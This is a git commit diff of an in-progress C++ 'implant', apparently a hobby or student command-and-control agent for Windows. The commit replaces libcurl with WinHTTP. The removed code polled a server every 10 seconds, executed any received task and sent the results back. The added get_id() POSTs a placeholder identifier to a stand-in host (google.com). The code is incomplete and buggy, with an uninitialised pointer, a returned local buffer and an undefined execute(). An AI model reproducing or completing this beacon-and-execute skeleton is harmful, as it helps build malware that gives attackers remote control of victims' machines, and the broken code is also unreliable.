ae6d50897ed4f28b3892106ae3cca7669b80921a
Addison Baum <70862672+addycb@users.noreply.github.com>
2022-11-30 19:43:32 -0500

    Deleted unneccesary curl, c file. Working on implant http using winhttp dll

--- Implant/implant.cpp
+++ Implant/implant.cpp
@@ -4,95 +4,138 @@ every 10 secs check for tasks->if tasks exit dispatch->append to dictionary->pos
 #include <stdio.h>
 #include <stdlib.h>
 #include <string>
-#include <curl/curl.h>
-
+#include <iostream>
+#include <Windows.h>
+#include <winhttp.h>
 #define SERVERNAME "placeholder"
 #define SLEEP 10
 
-size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string* data) {
-    data->append((char*) ptr, size * nmemb);
+
+LPCSTR needthis="winhttp.h";
+HMODULE winhttp=LoadLibraryA(needthis);
+
+size_t writeFunction(void *ptr, size_t size, size_t nmemb, std::string *data)
+{
+    data->append((char *)ptr, size * nmemb);
     return size * nmemb;
 }
-void tasks(){
-    while(1){
-        Sleep(SLEEP);
-        auto curl = curl_easy_init();
-        if (curl) {
-            curl_easy_setopt(curl, CURLOPT_URL, SERVERNAME);
-            curl_easy_setopt(curl, CURLOPT_NOPROGRESS, 1L);
-            curl_easy_setopt(curl, CURLOPT_USERPWD, "user:pass");
-            curl_easy_setopt(curl, CURLOPT_USERAGENT, "curl/7.42.0");
-            curl_easy_setopt(curl, CURLOPT_MAXREDIRS, 5L);
-            curl_easy_setopt(curl, CURLOPT_TCP_KEEPALIVE, 1L);
-            
-            std::string response_string;
-            std::string header_string;
 
-            curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writeFunction);
-            curl_easy_setopt(curl, CURLOPT_WRITEDATA, &response_string);
-            curl_easy_setopt(curl, CURLOPT_HEADERDATA, &header_string);
-            long response_code;
-            curl_easy_perform(curl);
-            curl_easy_getinfo(curl, CURLINFO_RESPONSE_CODE, &response_code);
-            if(response_code==200){
-                char * results=execute(response_string);
-                sendresults(results);
+
+void tasks()
+{
+    while (1)
+    {
+        Sleep(SLEEP);
+    }
+}
+
+int get_id()
+{
+    LPCWSTR postdata = L"mac address, some unique id";
+    DWORD datalen = wcslen(postdata);
+    LPCWSTR uniquedata = L"x";
+    HINTERNET asyncsesh = WinHttpOpen(
+        L"GenericAPICaller",
+        WINHTTP_ACCESS_TYPE_AUTOMATIC_PROXY,
+        WINHTTP_NO_PROXY_NAME,
+        WINHTTP_NO_PROXY_BYPASS,
+        WINHTTP_FLAG_ASYNC);
+    LPCWSTR servername = L"google.com";
+    if (asyncsesh != NULL)
+    {
+        HINTERNET connectsesh = WinHttpConnect(
+            asyncsesh,
+            servername,
+            INTERNET_DEFAULT_HTTPS_PORT,
+            0);
+        if (connectsesh != NULL)
+        {
+            HINTERNET request = WinHttpOpenRequest(
+                connectsesh,
+                L"POST",
+                L"get_id",
+                NULL,
+                WINHTTP_NO_REFERER,
+                WINHTTP_DEFAULT_ACCEPT_TYPES,
+                WINHTTP_FLAG_SECURE);
+            if (request != NULL)
+            {
+                BOOL idrequest = WinHttpSendRequest(
+                    request,
+                    WINHTTP_NO_ADDITIONAL_HEADERS,
+                    0,
+                    (LPVOID)postdata,
+                    datalen,
+                    0,
+                    0);
+                if (idrequest == TRUE)
+                {
+                    BOOL response = WinHttpReceiveResponse(
+                        request,
+                        NULL);
+                }
+                LPDWORD bytesneeded;
+                WinHttpQueryDataAvailable(
+                    request,
+                    bytesneeded);
+                char *returnbuffer = (char *)malloc((size_t)bytesneeded);
+                WinHttpReadData(
+                    request,
+                    returnbuffer,
+                    *bytesneeded,
+                    NULL);
+                std::cout << returnbuffer;
+                return 0;
             }
-            curl_easy_cleanup(curl);
-            curl = NULL;
         }
     }
+    return 0;
 }
 
-
-int sendresults(){
-    while(1){
+int sendresults()
+{
+    while (1){
         Sleep(SLEEP);
-        //Send results, check response
-        //If good response break
+        // Send results, check response
+        // If good response break
     }
-
 }
-
 
 // Random Implant ID in hex using rand()
 // https://stackoverflow.com/questions/33325814/how-to-loop-generate-random-256bit-hex-in-c-or-c
-char* random_id(){
-    char random_hex[32+1];
-    char * random_hexptr = random_hex;
+char *random_id()
+{
+    char random_hex[32 + 1];
+    char *random_hexptr = random_hex;
 
     srand(time(0));
-    for(int i = 0; i < 32; i++){
-        sprintf(random_hex+i, "%x", rand() % 32);
+    for (int i = 0; i < 32; i++)
+    {
+        sprintf(random_hex + i, "%x", rand() % 32);
     }
-    
+
     return random_hexptr;
 }
 
+char *make_base_payload(char *implant_id)
+{
 
-char* make_base_payload(char* implant_id){
-    
     char payload[51] = "{\"implant_id\": }";
-    char * payloadptr = payload;
+    char *payloadptr = payload;
     strcat(payload, implant_id);
     return payloadptr;
-
 }
 
-
-
-
-int main(int argc, char* argv[]){
+int main(int argc, char *argv[])
+{
 
     // char blah[33];
     // strcpy(blah, random_id());
     // printf("%s\n", blah);
 
-   // register_();
+    // register_();
 
-
+    get_id();
 
     return 0;
 }
-
-
